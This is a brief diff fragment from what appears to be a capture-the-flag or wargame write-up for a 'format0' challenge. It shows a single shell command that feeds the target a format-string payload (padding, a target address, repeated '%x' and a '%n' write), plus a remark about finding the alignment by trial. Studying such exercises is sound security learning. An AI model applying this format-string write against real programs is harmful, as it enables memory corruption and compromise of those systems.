@@ -17,4 +17,3 @@ My script
 ./format0 "$(python -c 'print "AAAA"+"\x38\x96\x04\x08"+"BB"+"%x "*128+"%n"')"
 
 For the momment i don't know if i can solve this more easelly, "AAAA" and "BB" were backtracked to find the right alignment
-
